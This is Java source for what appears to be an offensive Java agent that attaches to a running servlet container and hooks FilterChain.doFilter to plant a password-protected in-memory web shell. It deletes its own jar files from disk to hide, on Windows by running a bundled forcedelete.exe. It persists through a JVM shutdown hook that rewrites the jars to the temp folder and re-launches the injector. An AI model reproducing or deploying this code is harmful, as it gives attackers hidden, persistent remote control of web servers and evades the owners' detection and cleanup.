package cn.com.x1001;

import cn.com.x1001.bean.HookClass;
import cn.com.x1001.bean.InstrumentationContext;
import cn.com.x1001.hook.HookTransformer;

import java.io.*;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.management.RuntimeMXBean;
import java.util.Arrays;

public class Agent {
    //打印输出
    public static PrintStream out = System.out;
    public static InstrumentationContext context = new InstrumentationContext();
    public static String currentPath;
    public static String password = "test";
    private final static String AGENT_NAME = "shell-agent.jar";
    private final static String INJECT_NAME = "inject.jar";

    public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};


    public static void agentmain(String args, Instrumentation inst) throws IOException {
        if (args.contains("^")) {
            Agent.currentPath = args.split("\\^")[0];
            Agent.password = args.split("\\^")[1];
        } else {
            Agent.currentPath = args;
        }
        start(inst);
    }

    private static void start(Instrumentation inst) {
        out.println("********************************************************************");
        out.println("*                      shell inject success                        *");
        out.println("********************************************************************");
        addHook();
        inst.addTransformer(new HookTransformer(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();

        for (Class clazz : loadedClasses) {
            Class[] interfaces = clazz.getInterfaces();
            String name = clazz.getName().replace(".", "/");
            if (context.isExistClass(name) || context.isExistClass(interfaces)) {
                try {
                    // hook已经加载的类，或者是回滚已经加载的类
                    inst.retransformClasses(clazz);
                } catch (Throwable t) {
                    //
                }
            }

        }
        try {
            readInjectFile(Agent.currentPath);
            readAgentFile(Agent.currentPath);
            clear();
            persist();
        } catch (Exception e) {
            out.println(e.getMessage());
        }

    }

    public static void writeFiles(String fileName, byte[] data) throws Exception {
        String tempFolder = System.getProperty("java.io.tmpdir");
//        System.out.println("写入文件路径：" + tempFolder);
        FileOutputStream fso = new FileOutputStream(tempFolder + File.separator + fileName);
        fso.write(data);
        fso.close();
    }

    /**
     * 添加hook点
     */
    public static void addHook() {
        HookClass hookClass = new HookClass();
        hookClass.setClassName("javax/servlet/FilterChain");
        hookClass.addMethodDesc("doFilter", null);
        context.getClassHashSet().add(hookClass);
    }

    public static void persist() {
        try {
            Thread t = new Thread() {
                public void run() {
                    try {
                        writeFiles(INJECT_NAME, Agent.injectFileBytes);
                        writeFiles(AGENT_NAME, Agent.agentFileBytes);
                        startInject();
                    } catch (Exception e) {

                    }
                }
            };
            t.setName("shutdown Thread");
            Runtime.getRuntime().addShutdownHook(t);
        } catch (Throwable t) {

        }
    }

    private static void startInject() throws Exception {
        Thread.sleep(3000);
        String tempFolder = System.getProperty("java.io.tmpdir");
        String cmd = "java -jar " + tempFolder + File.separator + INJECT_NAME + " " + Agent.password;
        Runtime.getRuntime().exec(cmd);

    }

    static byte[] mergeByteArray(byte[]... byteArray) {
        int totalLength = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            totalLength += byteArray[i].length;
        }

        byte[] result = new byte[totalLength];
        int cur = 0;
        for (int i = 0; i < byteArray.length; i++) {
            if (byteArray[i] == null) {
                continue;
            }
            System.arraycopy(byteArray[i], 0, result, cur, byteArray[i].length);
            cur += byteArray[i].length;
        }

        return result;
    }

    public static void readInjectFile(String filePath) throws Exception {
        String fileName = INJECT_NAME;
        readFile(filePath, fileName);
    }

    public static void readAgentFile(String filePath) throws Exception {
        String fileName = AGENT_NAME;
        readFile(filePath, fileName);
    }

    private static void readFile(String filePath, String fileName) throws Exception {
        File f = new File(filePath + File.separator + fileName);
        if (!f.exists()) {
            f = new File(System.getProperty("java.io.tmpdir") + File.separator + fileName);
        }
        InputStream is = new FileInputStream(f);
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        while ((num = is.read(bytes)) != -1) {
            if (fileName.equals(AGENT_NAME))
                agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
            else if (fileName.equals(INJECT_NAME))
                injectFileBytes = mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
        }
        is.close();
    }

    public static void clear() throws Exception {
        Thread clearThread = new Thread() {
            String currentPath = Agent.currentPath;

            public void run() {
                try {
//                    System.out.println("delete path:" + currentPath);
                    Thread.sleep(5000);
                    String injectFile = currentPath + INJECT_NAME;
                    String agentFile = currentPath + AGENT_NAME;

                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("window")){
                        unlockFile(currentPath);
                    }
                    boolean delete1 = new File(injectFile).getCanonicalFile().delete();
                    boolean delete2 = new File(agentFile).delete();
//                    if (delete1 && delete2) {
//                        out.println("file delete success!!!");
//                    } else {
//                        out.println("file delete failed!!!");
//                    }

                } catch (Exception e) {
                    out.println(e);
                }
            }
        };
        clearThread.start();

    }

    public static void unlockFile(String currentPath) throws Exception {
        String exePath = currentPath + "forecedelete.exe";
        InputStream is = Agent.class.getResourceAsStream("/forcedelete.exe");
        FileOutputStream fos = new FileOutputStream(new File(exePath).getCanonicalPath());
        byte[] bytes = new byte[1024 * 100];
        int num = 0;
        if (is == null) {
            System.out.println("exe 读取为空");
            return;
        }
        while ((num = is.read(bytes)) != -1) {
            fos.write(bytes, 0, num);
            fos.flush();
        }
        fos.close();
        is.close();
        Process process = java.lang.Runtime.getRuntime().exec(exePath + " " + getCurrentPid());
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            System.out.println(e.getMessage());
        }
        new File(exePath).delete();
    }

    public static String getCurrentPid() {
        RuntimeMXBean runtimeMXBean = ManagementFactory.getRuntimeMXBean();
        return runtimeMXBean.getName().split("@")[0];
    }


}
